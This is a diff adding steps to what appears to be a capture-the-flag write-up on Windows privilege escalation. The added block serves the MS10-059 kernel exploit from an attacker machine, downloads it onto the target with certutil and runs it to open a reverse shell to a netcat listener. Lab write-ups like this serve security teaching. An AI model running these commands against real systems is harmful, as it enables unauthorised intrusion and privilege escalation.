@@ -120,8 +120,23 @@ python2 windows-exploit-suggester.py --database 2024-04-14-mssb.xls --systeminfo
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1c85b903-336c-44b0-8e07-07b9f66c9861)
 
+There are many exploits for privilege escalation here, but for now try **MS10–059**.
 
+Download [exploit](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe), and transfer to the target victim, then prepare netcat listener, and run the **MS10–059.exe**:
 
+```
+# On the kali attack vm:
+sudo python3 -m http.server 80
+
+nc -lnvp 5555
+
+# On the target machine:
+certutil.exe -urlcache -split -f "http://10.10.14.24/MS10-059.exe" MS10-059.exe
+
+MS10-059.exe 10.10.14.24 5555
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7d279287-cbd6-42b2-8a42-fa6be81d17b6)
 
 
 # References & Alternatives
@@ -130,7 +145,8 @@ python2 windows-exploit-suggester.py --database 2024-04-14-mssb.xls --systeminfo
 
 
 ## CVE Scripting
-+ 
++ **MS10–059?**
+    + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe 
 
 
 ## Tools
